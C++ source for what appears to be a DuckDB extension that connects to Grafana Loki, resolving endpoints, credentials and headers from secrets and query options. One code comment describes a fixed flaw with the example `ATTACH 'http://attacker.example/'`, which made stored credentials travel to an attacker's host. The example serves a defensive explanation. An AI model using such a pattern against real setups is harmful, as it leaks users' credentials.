#include "loki/connection.hpp"

#include "loki/time_bounds.hpp"

#include "duckdb/catalog/catalog_transaction.hpp"
#include "duckdb/common/exception.hpp"
#include "duckdb/common/string_util.hpp"
#include "duckdb/common/types/interval.hpp"
#include "duckdb/common/types/timestamp.hpp"
#include "duckdb/common/types/value.hpp"
#include "duckdb/main/secret/secret.hpp"
#include "duckdb/main/secret/secret_manager.hpp"

#include <exception>
#include <utility>
#include <vector>

namespace duckdb {

namespace {

// Extract key/value pairs from a MAP(VARCHAR, VARCHAR) Value into a header list.
void AppendHeadersFromMap(const Value &map_value, std::vector<std::pair<std::string, std::string>> &out) {
	if (map_value.IsNull()) {
		return;
	}
	for (const auto &entry : ListValue::GetChildren(map_value)) {
		auto kv = StructValue::GetChildren(entry);
		if (kv.size() != 2 || kv[0].IsNull()) {
			continue; // not a MAP entry struct, or a key a MAP cannot actually hold
		}
		// Value::ToString() renders a NULL as the literal string "NULL", which would go out on the
		// wire as a real header value. Reject it rather than send a header the user never wrote.
		if (kv[1].IsNull()) {
			throw BinderException("loki: header '%s' has a NULL value; drop the entry or pass an empty string",
			                      kv[0].ToString());
		}
		out.emplace_back(kv[0].ToString(), kv[1].ToString());
	}
}

// Read a secret that must be a `loki` secret. `secret :=` / the ATTACH secret name accept any
// secret type, but the fields differ per type — an `http` secret stores `bearer_token`, not
// `token`, so reading it as a loki secret silently produces an *unauthenticated* request while
// the user believes they authenticated. Also guards the dynamic_cast: another extension may
// register a secret type that is not a KeyValueSecret, and a failed reference cast would abort
// with std::bad_cast instead of a readable error.
const KeyValueSecret &RequireLokiSecret(const BaseSecret &secret, const std::string &name, const char *fn) {
	if (secret.GetType() != "loki") {
		throw BinderException("%s: secret '%s' has type '%s', expected type 'loki' — create one with "
		                      "CREATE SECRET (TYPE loki, ENDPOINT ...)",
		                      fn, name, secret.GetType());
	}
	const auto *kv = dynamic_cast<const KeyValueSecret *>(&secret);
	if (!kv) {
		throw BinderException("%s: secret '%s' is not a key-value secret", fn, name);
	}
	return *kv;
}

// Copy a `loki` secret's fields into the connection config being assembled.
void ReadLokiSecret(const KeyValueSecret &kv, std::string &endpoint, loki::AuthConfig &auth,
                    std::vector<std::pair<std::string, std::string>> &headers) {
	Value v;
	if (kv.TryGetValue("endpoint", v) && !v.IsNull()) {
		endpoint = v.ToString();
	}
	if (kv.TryGetValue("token", v) && !v.IsNull()) {
		auth.token = v.ToString();
	}
	if (kv.TryGetValue("username", v) && !v.IsNull()) {
		auth.username = v.ToString();
	}
	if (kv.TryGetValue("password", v) && !v.IsNull()) {
		auth.password = v.ToString();
	}
	if (kv.TryGetValue("tenant", v) && !v.IsNull()) {
		auth.tenant = v.ToString();
	}
	if (kv.TryGetValue("headers", v)) {
		AppendHeadersFromMap(v, headers);
	}
}

// Convert a bound TIMESTAMP/TIMESTAMPTZ/VARCHAR parameter to a nanosecond Unix epoch.
// Casting to TIMESTAMP yields UTC microseconds, which GetEpochNanoSeconds scales to ns.
int64_t ValueToEpochNs(const Value &value) {
	Value as_ts = value.DefaultCastAs(LogicalType::TIMESTAMP);
	auto ts = as_ts.GetValue<timestamp_t>();
	int64_t ns;
	if (!ts.IsFinite() || !Timestamp::TryGetEpochNanoSeconds(ts, ns)) {
		throw BinderException("loki: time bound '%s' is outside the range representable in nanoseconds "
		                      "(1677-09-21 .. 2262-04-11)",
		                      as_ts.ToString());
	}
	return ns;
}

} // namespace

const Value *FindNamedParam(TableFunctionBindInput &input, const char *name) {
	auto it = input.named_parameters.find(name);
	if (it == input.named_parameters.end() || it->second.IsNull()) {
		return nullptr;
	}
	return &it->second;
}

int64_t ResolveTimeBound(const Value &value, int64_t now_ns) {
	if (value.type().id() == LogicalTypeId::INTERVAL) {
		auto iv = value.GetValue<interval_t>();
		int64_t offset_ns;
		try {
			offset_ns = loki::IntervalToNanos(iv.months, iv.days, iv.micros);
		} catch (const std::exception &e) {
			throw BinderException(e.what());
		}
		// Checked: `now + offset` overflowing int64 is UB and would silently invert the window.
		int64_t result;
		if (!loki::TryAddNanos(now_ns, offset_ns, result)) {
			throw BinderException("loki: INTERVAL time bound is too far from now to express as a nanosecond "
			                      "timestamp; pass an absolute TIMESTAMP instead");
		}
		return result;
	}
	return ValueToEpochNs(value);
}

void ResolveLokiConnection(ClientContext &context, TableFunctionBindInput &input, std::string &endpoint,
                           loki::AuthConfig &auth, const char *fn) {
	std::vector<std::pair<std::string, std::string>> secret_headers;

	// Resolve the endpoint the query names *before* the secret lookup, and use it as the lookup
	// path. A secret's credentials must only be selected for — and therefore only sent to — an
	// endpoint its SCOPE covers. Looking up with an empty path did the opposite: every SCOPE'd
	// secret scored INT64_MIN and was discarded (BaseSecret::MatchScore), so scoping silently did
	// nothing, while an unscoped secret was attached to whatever host `endpoint :=` named. An
	// unscoped secret still matches any path at score 0, so the default-secret flow is unchanged.
	const Value *endpoint_param = FindNamedParam(input, "endpoint");
	std::string inline_endpoint = endpoint_param ? endpoint_param->ToString() : std::string();

	// Resolve connection config: a `loki` secret, refined by inline overrides.
	auto &secret_manager = SecretManager::Get(context);
	auto transaction = CatalogTransaction::GetSystemCatalogTransaction(context);
	if (auto *secret_param = FindNamedParam(input, "secret")) {
		// Explicit secret name — must exist, and must be a `loki` secret.
		auto name = secret_param->ToString();
		auto entry = secret_manager.GetSecretByName(transaction, name);
		if (!entry) {
			throw BinderException("%s: no secret named '%s' found", fn, name);
		}
		ReadLokiSecret(RequireLokiSecret(*entry->secret, name, fn), endpoint, auth, secret_headers);
	} else {
		// No explicit secret: fall back to the best-matching `loki` secret for this endpoint. DuckDB
		// names an unnamed CREATE SECRET (TYPE loki, ...) `__default_loki`, and empty-scope secrets
		// match any path at the lowest score; ties go to the name that sorts first, upper-cased.
		auto match = secret_manager.LookupSecret(transaction, inline_endpoint, "loki");
		if (match.HasMatch()) {
			ReadLokiSecret(RequireLokiSecret(match.GetSecret(), match.GetSecret().GetName().GetIdentifierName(), fn),
			               endpoint, auth, secret_headers);
		}
	}

	// Inline overrides take precedence over the secret.
	if (endpoint_param) {
		endpoint = inline_endpoint;
	}
	if (auto *p = FindNamedParam(input, "token")) {
		auth.token = p->ToString();
	}
	if (auto *p = FindNamedParam(input, "username")) {
		auth.username = p->ToString();
	}
	if (auto *p = FindNamedParam(input, "password")) {
		auth.password = p->ToString();
	}
	if (auto *p = FindNamedParam(input, "tenant")) {
		auth.tenant = p->ToString();
	}
	if (auto *p = FindNamedParam(input, "headers")) {
		// Inline headers replace the secret's headers.
		secret_headers.clear();
		AppendHeadersFromMap(*p, secret_headers);
	}
	auth.extra_headers = std::move(secret_headers);

	if (endpoint.empty()) {
		throw BinderException("%s requires an endpoint: pass endpoint := 'http://localhost:3100' or "
		                      "reference a secret (secret := 'my_loki', or a default secret created with "
		                      "CREATE SECRET (TYPE loki, ENDPOINT ...))",
		                      fn);
	}
	while (!endpoint.empty() && endpoint.back() == '/') {
		endpoint.pop_back();
	}
}

void ResolveLokiConnectionFromOptions(ClientContext &context, const std::string &path,
                                      const unordered_map<std::string, Value> &options, std::string &endpoint,
                                      loki::AuthConfig &auth, const char *fn) {
	std::vector<std::pair<std::string, std::string>> secret_headers;

	// Look up an attach option by (already-lowercased) key, skipping NULLs.
	auto opt = [&](const char *key) -> const Value * {
		auto it = options.find(key);
		if (it == options.end() || it->second.IsNull()) {
			return nullptr;
		}
		return &it->second;
	};

	// An optional `loki:` prefix is stripped before the path is classified at all. DuckDB gates
	// ATTACH on any path that *looks* like a remote file: DatabaseManager::AttachDatabase maps the
	// `http://` prefix to httpfs and throws MissingExtensionException unless that extension can be
	// loaded — before the storage extension is ever consulted, so `TYPE loki` does not exempt us,
	// even though we do our own HTTP and never touch httpfs. `ATTACH 'loki:http://host'` hides the
	// URL from that check (the same shape as `ducklake:`), which is also what makes the ATTACH
	// suite runnable in CI, where no extension is installed.
	std::string bare_path = path;
	if (StringUtil::StartsWith(StringUtil::Lower(path), "loki:")) {
		bare_path = path.substr(5);
	}

	// An http(s):// path is the endpoint; any other non-empty path is a secret name (unless a
	// `secret` option overrides it). This mirrors the two ATTACH forms in DESIGN.md §3.6.
	std::string lower_path = StringUtil::Lower(bare_path);
	bool path_is_url = StringUtil::StartsWith(lower_path, "http://") || StringUtil::StartsWith(lower_path, "https://");
	std::string secret_name;
	if (auto *p = opt("secret")) {
		secret_name = p->ToString();
	} else if (!path_is_url && !bare_path.empty()) {
		secret_name = bare_path;
	}

	// The endpoint this ATTACH names, resolved before the secret lookup so it can be the lookup
	// path — see ResolveLokiConnection for why an empty path both disabled SCOPE and let a secret
	// travel to an arbitrary host (here: `ATTACH 'http://attacker.example/' (TYPE loki)`).
	std::string inline_endpoint;
	if (auto *p = opt("endpoint")) {
		inline_endpoint = p->ToString();
	} else if (path_is_url) {
		inline_endpoint = bare_path;
	}

	auto &secret_manager = SecretManager::Get(context);
	auto transaction = CatalogTransaction::GetSystemCatalogTransaction(context);
	if (!secret_name.empty()) {
		auto entry = secret_manager.GetSecretByName(transaction, secret_name);
		if (!entry) {
			throw BinderException("%s: no secret named '%s' found", fn, secret_name);
		}
		ReadLokiSecret(RequireLokiSecret(*entry->secret, secret_name, fn), endpoint, auth, secret_headers);
	} else {
		// No secret name and an endpoint URL (or nothing): still honor a default `loki` secret for
		// auth/tenant; the inline URL below overrides its endpoint. (Plain declaration + if, not a
		// C++17 if-init statement — DuckDB's extension build is C++11 and CI rejects the extension.)
		auto match = secret_manager.LookupSecret(transaction, inline_endpoint, "loki");
		if (match.HasMatch()) {
			ReadLokiSecret(RequireLokiSecret(match.GetSecret(), match.GetSecret().GetName().GetIdentifierName(), fn),
			               endpoint, auth, secret_headers);
		}
	}

	// Inline overrides take precedence over the secret (a URL path counts as an endpoint override).
	if (path_is_url) {
		endpoint = bare_path;
	}
	if (auto *p = opt("endpoint")) {
		endpoint = p->ToString();
	}
	if (auto *p = opt("token")) {
		auth.token = p->ToString();
	}
	if (auto *p = opt("username")) {
		auth.username = p->ToString();
	}
	if (auto *p = opt("password")) {
		auth.password = p->ToString();
	}
	if (auto *p = opt("tenant")) {
		auth.tenant = p->ToString();
	}
	if (auto *p = opt("headers")) {
		secret_headers.clear();
		AppendHeadersFromMap(*p, secret_headers);
	}
	auth.extra_headers = std::move(secret_headers);

	if (endpoint.empty()) {
		throw BinderException("%s requires an endpoint: ATTACH an http(s):// URL (optionally written "
		                      "'loki:http://...', which avoids DuckDB's httpfs requirement for remote paths), pass "
		                      "ENDPOINT, or reference a loki secret (SECRET 'my_loki', or a default CREATE SECRET "
		                      "(TYPE loki, ENDPOINT ...))",
		                      fn);
	}
	while (!endpoint.empty() && endpoint.back() == '/') {
		endpoint.pop_back();
	}
}

} // namespace duckdb
